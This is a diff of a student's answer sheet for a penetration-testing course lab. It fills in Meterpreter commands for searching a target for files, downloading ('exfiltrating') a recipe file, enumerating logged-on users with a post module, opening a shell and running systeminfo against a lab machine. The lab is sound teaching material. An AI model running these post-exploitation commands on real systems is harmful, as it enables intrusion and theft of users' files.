@@ -62,28 +62,25 @@ You've been provided full access to the network and are getting ping responses f
  
    - Run the command that performs a search for the `secretfile.txt` on the target.
       
-     > Answer: ```search -f *secretfile*.txt```
-
-![secret](/17-Pentration-Testing-2/screenshots/search_file.png)
+     > Answer: ```search -f *secretfile.txt```
   
- 7. You should now have a Meterpreter session open.
+1. You should now have a Meterpreter session open.
  
-    - Run the command to performs a search for the `recipe.txt` on the target:
+  - Run the command to performs a search for the `recipe.txt` on the target:
 
-      > Answer: ```search -f *recipe*.txt```
+      > Answer: ```search -f *recipe.txt```
 
-![recipe](/17-Pentration-Testing-2/screenshots/recipe.png)
+![search](/17-Pentration-Testing-2/screenshots/search.png) 
  
- 
-    - **Bonus**: Run the command that exfiltrates the `recipe*.txt` file:
+  - **Bonus**: Run the command that exfiltrates the `recipe*.txt` file:
 
 
-      > Answer: ```download 'c:\Users\IEUser\Documents\Drinks.recipe.txt'```
+> Answer: ```download 'c:\Users\IEUser\Documents\Drinks.recipe.txt'```
 
 ![recipe](/17-Pentration-Testing-2/screenshots/download.png)
  
 
-8. You can also use Meterpreter's local exploit suggester to find possible exploits.
+1. You can also use Meterpreter's local exploit suggester to find possible exploits.
 
  
    - **Note:** The exploit suggester is just that: a suggestion. Keep in mind that the listed suggestions may not include all available exploits.
@@ -94,19 +91,17 @@ You've been provided full access to the network and are getting ping responses f
  
 A. Run a Meterpreter post script that enumerates all logged on users.
 
-  > Answer:
+  > Answer: ```run post/windows/gather/enum_logged_on_users```
+
+![users](/17-Pentration-Testing-2/screenshots/users.png)
  
      
 B. Open a Meterpreter shell. 
  
-  > Answer: 
+  > Answer:  ```shell```
  
 C. Run the command that displays the target's computer system information:
 
-   > Answer: 
+   > Answer: ```systeminfo```
 
-
-
----
-
-&copy; 2020 Trilogy Education Services, a 2U Inc Brand.   All Rights Reserved.
+![systeminfo](/17-Pentration-Testing-2/screenshots/sysinfo.png)
